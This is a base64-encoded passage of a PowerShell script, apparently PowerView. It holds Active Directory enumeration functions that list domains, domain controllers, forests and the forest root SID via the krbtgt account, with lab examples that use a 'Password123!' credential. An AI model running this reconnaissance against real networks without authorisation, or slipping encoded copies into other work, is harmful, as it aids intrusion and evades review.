luZ3Vpc2hlZG5hbWUsZG5zcmVjb3JkLHdoZW5jcmVhdGVkLHdoZW5jaGFuZ2VkCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdab25lTmFtZScgJFpvbmVOYW1lCgogICAgICAgICAgICAgICAgICAgICMgY29udmVydCB0aGUgcmVjb3JkIGFuZCBleHRyYWN0IHRoZSBwcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRPdXQuZG5zcmVjb3JkIC1pcyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlJlc3VsdFByb3BlcnR5VmFsdWVDb2xsZWN0aW9uXSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIFRPRE86IGhhbmRsZSBtdWx0aXBsZSBuZXN0ZWQgcmVjb3JkcyBwcm9wZXJseT8KICAgICAgICAgICAgICAgICAgICAgICAgJFJlY29yZCA9IENvbnZlcnQtRE5TUmVjb3JkIC1ETlNSZWNvcmQgJE91dC5kbnNyZWNvcmRbMF0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZWNvcmQgPSBDb252ZXJ0LUROU1JlY29yZCAtRE5TUmVjb3JkICRPdXQuZG5zcmVjb3JkCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFJlY29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkUmVjb3JkLlBTT2JqZWN0LlByb3BlcnRpZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJF8uTmFtZSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5ETlNSZWNvcmQnKQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbkROU1JlY29yZF0gRXJyb3I6ICRfIgogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluRE5TUmVjb3JkXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyB0aGUgZG9tYWluIG9iamVjdCBmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lICAKCi5ERVNDUklQVElPTgoKUmV0dXJucyBhIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluIG9iamVjdCBmb3IgdGhlIGN1cnJlbnQKZG9tYWluIG9yIHRoZSBkb21haW4gc3BlY2lmaWVkIHdpdGggLURvbWFpbiBYLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIG5hbWUgdG8gcXVlcnkgZm9yLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbiAtRG9tYWluIHRlc3RsYWIubG9jYWwKCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4KCkEgY29tcGxleCAuTkVUIGRvbWFpbiBvYmplY3QuCgouTElOSwoKaHR0cDovL3NvY2lhbC50ZWNobmV0Lm1pY3Jvc29mdC5jb20vRm9ydW1zL3NjcmlwdGNlbnRlci9lbi1VUy8wYzViM2Y4My1lNTI4LTRkNDktOTJhNC1kZWUzMWY0YjQ4MWMvZmluZGluZy10aGUtZG4tb2YtdGhlLXRoZS1kb21haW4td2l0aG91dC1hZG1vZHVsZS1pbi1wb3dlcnNoZWxsP2ZvcnVtPUlUQ0cKIz4KCiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbicKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgIyBpZiBubyBkb21haW4gaXMgc3VwcGxpZWQsIGV4dHJhY3QgdGhlIGxvZ29uIGRvbWFpbiBmcm9tIHRoZSBQU0NyZWRlbnRpYWwgcGFzc2VkCiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Eb21haW4KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBmcm9tIC1DcmVkZW50aWFsIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkRG9tYWluQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdEb21haW4nLCAkVGFyZ2V0RG9tYWluLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXREb21haW4oJERvbWFpbkNvbnRleHQpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIFRoZSBzcGVjaWZpZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkRG9tYWluQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdEb21haW4nLCAkRG9tYWluKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJERvbWFpbicgZG9lcyBub3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIG9yIHRoZXJlIGlzbid0IGFuIGV4aXN0aW5nIHRydXN0IDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXRDdXJyZW50RG9tYWluKCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gRXJyb3IgcmV0cmlldmluZyB0aGUgY3VycmVudCBkb21haW46ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkNvbnRyb2xsZXIgewo8IwouU1lOT1BTSVMKClJldHVybiB0aGUgZG9tYWluIGNvbnRyb2xsZXJzIGZvciB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgR2V0LURvbWFpbiAgCgouREVTQ1JJUFRJT04KCkVudW1lcmF0ZXMgdGhlIGRvbWFpbiBjb250cm9sbGVycyBmb3IgdGhlIGN1cnJlbnQgb3Igc3BlY2lmaWVkIGRvbWFpbi4KQnkgZGVmYXVsdCBidWlsdCBpbiAuTkVUIG1ldGhvZHMgYXJlIHVzZWQuIFRoZSAtTERBUCBzd2l0Y2ggdXNlcyBHZXQtRG9tYWluQ29tcHV0ZXIKdG8gc2VhcmNoIGZvciBkb21haW4gY29udHJvbGxlcnMuCgouUEFSQU1FVEVSIERvbWFpbgoKVGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgZG9tYWluIGNvbnRyb2xsZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgTERBUAoKU3dpdGNoLiBVc2UgTERBUCBxdWVyaWVzIHRvIGRldGVybWluZSB0aGUgZG9tYWluIGNvbnRyb2xsZXJzIGluc3RlYWQgb2YgYnVpbHQgaW4gLk5FVCBtZXRob2RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db250cm9sbGVyIC1Eb21haW4gJ3Rlc3QubG9jYWwnCgpEZXRlcm1pbmUgdGhlIGRvbWFpbiBjb250cm9sbGVycyBmb3IgJ3Rlc3QubG9jYWwnLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db250cm9sbGVyIC1Eb21haW4gJ3Rlc3QubG9jYWwnIC1MREFQCgpEZXRlcm1pbmUgdGhlIGRvbWFpbiBjb250cm9sbGVycyBmb3IgJ3Rlc3QubG9jYWwnIHVzaW5nIExEQVAgcXVlcmllcy4KCi5FWEFNUExFCgondGVzdC5sb2NhbCcgfCBHZXQtRG9tYWluQ29udHJvbGxlcgoKRGV0ZXJtaW5lIHRoZSBkb21haW4gY29udHJvbGxlcnMgZm9yICd0ZXN0LmxvY2FsJy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluQ29udHJvbGxlciAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5Db21wdXRlcgoKT3V0cHV0cyBjdXN0b20gUFNPYmplY3RzIHdpdGggZGV0YWlscyBhYm91dCB0aGUgZW51bWVyYXRlZCBkb21haW4gY29udHJvbGxlciBpZiAtTERBUCBpcyBzcGVjaWZpZWQuCgpTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbkNvbnRyb2xsZXIKCklmIC1MREFQIGlzbid0IHNwZWNpZmllZC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlcicpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluQ29udHJvbGxlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRMREFQLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KCiAgICAgICAgICAgICMgVUFDIHNwZWNpZmljYXRpb24gZm9yIGRvbWFpbiBjb250cm9sbGVycwogICAgICAgICAgICAkQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKScKCiAgICAgICAgICAgIEdldC1Eb21haW5Db21wdXRlciBAQXJndW1lbnRzCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRm91bmREb21haW4gPSBHZXQtRG9tYWluIEBBcmd1bWVudHMKICAgICAgICAgICAgaWYgKCRGb3VuZERvbWFpbikgewogICAgICAgICAgICAgICAgJEZvdW5kRG9tYWluLkRvbWFpbkNvbnRyb2xsZXJzCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRm9yZXN0IHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBmb3Jlc3Qgb2JqZWN0IGZvciB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBmb3Jlc3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IENvbnZlcnRUby1TSUQgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIGEgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3Qgb2JqZWN0IGZvciB0aGUgY3VycmVudApmb3Jlc3Qgb3IgdGhlIGZvcmVzdCBzcGVjaWZpZWQgd2l0aCAtRm9yZXN0IFguCgouUEFSQU1FVEVSIEZvcmVzdAoKVGhlIGZvcmVzdCBuYW1lIHRvIHF1ZXJ5IGZvciwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZm9yZXN0LgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZm9yZXN0LgoKLkVYQU1QTEUKCkdldC1Gb3Jlc3QgLUZvcmVzdCBleHRlcm5hbC5kb21haW4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRm9yZXN0IC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdAoKT3V0cHV0cyBhIFBTT2JqZWN0IGNvbnRhaW5pbmcgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Gb3Jlc3QgaW4gYWRkaXRpb24KdG8gdGhlIGZvcmVzdCByb290IGRvbWFpbiBTSUQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRm9yZXN0XSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Gb3Jlc3QiCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgewogICAgICAgICAgICAgICAgJFRhcmdldEZvcmVzdCA9ICRGb3Jlc3QKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICMgaWYgbm8gZG9tYWluIGlzIHN1cHBsaWVkLCBleHRyYWN0IHRoZSBsb2dvbiBkb21haW4gZnJvbSB0aGUgUFNDcmVkZW50aWFsIHBhc3NlZAogICAgICAgICAgICAgICAgJFRhcmdldEZvcmVzdCA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuRG9tYWluCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gRXh0cmFjdGVkIGRvbWFpbiAnJEZvcmVzdCcgZnJvbSAtQ3JlZGVudGlhbCIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJEZvcmVzdENvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRm9yZXN0JywgJFRhcmdldEZvcmVzdCwgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRUYXJnZXRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCwgb3IgdGhlIHNwZWNpZmllZCBjcmVkZW50aWFscyBhcmUgaW52YWxpZDogJF8iCiAgICAgICAgICAgICAgICAkTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgewogICAgICAgICAgICAkRm9yZXN0Q29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdGb3Jlc3QnLCAkRm9yZXN0KQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdDogJF8iCiAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyBvdGhlcndpc2UgdXNlIHRoZSBjdXJyZW50IGZvcmVzdAogICAgICAgICAgICAkRm9yZXN0T2JqZWN0ID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRm9yZXN0XTo6R2V0Q3VycmVudEZvcmVzdCgpCiAgICAgICAgfQoKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAjIGdldCB0aGUgU0lEIG9mIHRoZSBmb3Jlc3Qgcm9vdAogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAoR2V0LURvbWFpblVzZXIgLUlkZW50aXR5ICJrcmJ0Z3QiIC1Eb21haW4gJEZvcmVzdE9iamVjdC5Sb290RG9tYWluLk5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLm9iamVjdHNpZAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEZvcmVzdFNpZCA9IChHZXQtRG9tYWluVXNlciAtSWRlbnRpdHkgImtyYnRndCIgLURvbWFpbiAkRm9yZXN0T2JqZWN0LlJvb3REb21haW4uTmFtZSkub2JqZWN0c2lkCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRQYXJ0cyA9ICRGb3Jlc3RTaWQgLVNwbGl0ICctJwogICAgICAgICAgICAkRm9yZXN0U2lkID0gJFBhcnRzWzAuLiQoJFBhcnRzLmxlbmd0aC0yKV0gLWpvaW4gJy0nCiAgICAgICAgICAgICRGb3Jlc3RPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnUm9vdERvbWFpblNpZCcgJEZvcmVzdFNpZAogICAgICAgICAgICAkRm9yZXN0T2JqZWN0CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LUZvcmVzdERvbWFpbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBkb21haW5zIGZvciB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBmb3Jlc3QuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Gb3Jlc3QgIAoKLkRFU0NSSVBUSU9OCgpSZXR1cm5zIGFsbCBkb21haW5zIGZvciB0aGUgY3VycmVudCBmb3Jlc3Qgb3IgdGhlIGZvcmVzdCBzcGVjaWZpZWQKYnkgLUZvcmVzdCBYLgoKLlBBUkFNRVRFUiBGb3Jlc3QKClNwZWNpZmllcyB0aGUgZm9yZXN0IG5hbWUgdG8gcXVlcnkgZm9yIGRvbWFpbnMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdG